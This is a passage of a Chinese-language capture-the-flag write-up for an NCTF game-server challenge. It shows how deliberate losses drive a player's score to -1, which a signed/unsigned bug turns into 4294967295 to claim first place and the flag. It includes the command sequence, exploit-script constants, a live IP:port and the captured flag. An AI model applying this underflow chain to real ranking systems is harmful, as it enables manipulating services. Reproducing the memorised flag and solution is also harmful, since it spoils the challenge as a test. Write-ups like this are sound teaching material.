+<h3 id="7-如何构造出-10-delta-1">7. 如何构造出 <code>10 + delta = -1</code></h3>
+<p>思路是把自己精确送到 <code>10</code> 分，然后去输给 <code>7</code> 分对手。</p>
+<p>为什么是 <code>7</code> 分？</p>
+<p>因为在 <code>10</code> 分打输给 <code>7</code> 分对手时，实测结算是：</p>
+<pre><code>Delta = -11
+10 + (-11) = -1</code></pre>
+<p>这就正好命中溢出点。</p>
+<hr>
+<h3 id="8-可达分数链">8. 可达分数链</h3>
+<p>远端上可以稳定走出下面这条链：</p>
+<pre><code>50 --Win 10--&gt; 53
+53 --Lose 20--&gt; 37
+37 --Lose 20--&gt; 23
+23 --Lose 30--&gt; 15
+15 --Lose 38--&gt; 10
+10 --Lose 7 --&gt; -1 --&gt; 4294967295</code></pre>
+<p>拆开解释：</p>
+<h4 id="第一步-赢-10-分对手">第一步：赢 10 分对手</h4>
+<p>初始是 <code>50</code>。</p>
+<p>抽到 <code>10</code> 分机器人后，按固定必胜序列下：</p>
+<pre><code>7,7 -&gt; 8,7 -&gt; 9,7 -&gt; 10,7 -&gt; 11,7</code></pre>
+<p>得到：</p>
+<pre><code>50 -&gt; 53</code></pre>
+<p>同时，该机器人会从 <code>10</code> 变成 <code>7</code>，被留作最后一步使用。</p>
+<h4 id="第二步到第五步-故意输棋调分">第二步到第五步：故意输棋调分</h4>
+<p>接下来故意输给指定分数的对手：</p>
+<pre><code>53 --Lose 20--&gt; 37
+37 --Lose 20--&gt; 23
+23 --Lose 30--&gt; 15
+15 --Lose 38--&gt; 10</code></pre>
+<p>这里的 <code>38</code> 不是 reset 初始就有的，而是经过前面若干步后对手池自然演化出来的分数。</p>
+<h4 id="最后一步-10-分输给-7-分">最后一步：10 分输给 7 分</h4>
+<p>抽到第一步里被我们打成 <code>7</code> 分的那个对手，故意输掉：</p>
+<pre><code>10 --Lose 7--&gt; -1</code></pre>
+<p>程序最终显示为：</p>
+<pre><code>OK Score=4294967295 Rank=1</code></pre>
+<p>此时再调用 <code>cmd=1</code> 就能拿到 flag。</p>
+<hr>
+<h3 id="9-为什么这个-exp-可以单连接完成">9. 为什么这个 exp 可以单连接完成</h3>
+<p>这题远端在多连接场景下会有一些不稳定现象，容易误判状态。所以最稳的打法反而是：</p>
+<ul>
+<li>全程只用一条 TCP 连接</li>
+<li>不断 <code>cmd=5</code> 抽对手</li>
+<li>如果不是想要的分数，就空棋盘 <code>cmd=8</code></li>
+<li>用 <code>Draw Delta=0</code> 无损重抽</li>
+</ul>
+<p>这样就不需要处理并发、实例漂移、共享状态污染之类的问题。</p>
+<hr>
+<h3 id="10-利用脚本思路">10. 利用脚本思路</h3>
+<p>当前目录中的 <span>exploit_47768.py</span> <code>E:\ctf\NCTF\鸡爪流高手\exploit_47768.py</code> 就是最终利用。</p>
+<p>核心思路很简单：</p>
+<h4 id="redraw-until-sock-target-score"><code>redraw_until(sock, target_score)</code></h4>
+<p>不断：</p>
+<ol>
+<li><code>cmd=5</code> 匹配</li>
+<li>看返回的 <code>Score=...</code></li>
+<li>如果不是目标分数，就立刻空棋盘 <code>cmd=8</code></li>
+</ol>
+<p>因为空棋盘认输是：</p>
+<pre><code>Draw Delta=0</code></pre>
+<p>所以不会影响当前分数。</p>
+<h4 id="do-win-10-sock"><code>do_win_10(sock)</code></h4>
+<p>先重抽到 <code>10</code> 分对手，再执行固定赢法：</p>
+<pre><code>WIN_SEQ = [(7, 7), (8, 7), (9, 7), (10, 7), (11, 7)]</code></pre>
+<h4 id="do-loss-to-sock-target-score"><code>do_loss_to(sock, target_score)</code></h4>
+<p>先抽到指定分数对手，然后：</p>
+<ol>
+<li>随便下一手，比如 <code>7,7</code></li>
+<li><code>cmd=8</code> 认输</li>
+</ol>
+<p>利用脚本中的目标序列是：</p>
+<pre><code>TARGETS = [
+    (&quot;W&quot;, 10),
+    (&quot;L&quot;, 20),
+    (&quot;L&quot;, 20),
+    (&quot;L&quot;, 30),
+    (&quot;L&quot;, 38),
+    (&quot;L&quot;, 7),
+]</code></pre>
+<hr>
+<h3 id="11-实战输出">11. 实战输出</h3>
+<p>在 <code>114.66.24.221:46467</code> 上实测，最后关键输出为：</p>
+<pre><code>[resign] Resign Delta=-11 Score=4294967295 Rank=1 OppDelta=11 OppScore=18
+[final status] OK Score=4294967295 Rank=1
+[claim] NCTF{b6247961-9c56-4e99-b4bf-dc98fd931e07}</code></pre>
+<p>排行榜也变成了：</p>
+<pre><code>Score=4294967295 Rank=1 Total=1008 Top=4294967295 Nearby:
+#1 player(4294967295)
+#2 初见沉沦(2000000)
+...</code></pre>
+<p>说明 <code>player</code> 已经成功成为榜一，领奖条件满足。</p>
+<hr>
+<h3 id="12-最终结论">12. 最终结论</h3>
+<p>这题的核心不是并发，不是 stale board，也不是正常 Elo 刷榜。</p>
+<p>真正可落地的解法是：</p>
+<ol>
+<li>利用空棋盘 <code>cmd=8</code> 无损重抽目标对手</li>
+<li>先赢一次 <code>10</code> 分 AI，把它打成 <code>7</code></li>
+<li>再按 <code>20 -&gt; 20 -&gt; 30 -&gt; 38 -&gt; 7</code> 这条链故意输棋调分</li>
+<li>在 <code>10</code> 分时输给 <code>7</code> 分对手，让分数变成 <code>-1</code></li>
+<li>利用有符号/无符号混用，把 <code>-1</code> 写成 <code>4294967295</code></li>
+<li>调用 <code>cmd=1</code> 直接拿 flag</li>
+</ol>
+<p>这也是本题最稳定、最短、最适合远端复现的利用链。</p>
+        </section>
+      </article>
+    </main>
+
+    <footer class="site-footer"><span>? 2026 suancai_soup</span><a href="../archive.html">????</a></footer>
+    <script src="../assets/js/main.js"></script>
+  </body>
+</html>
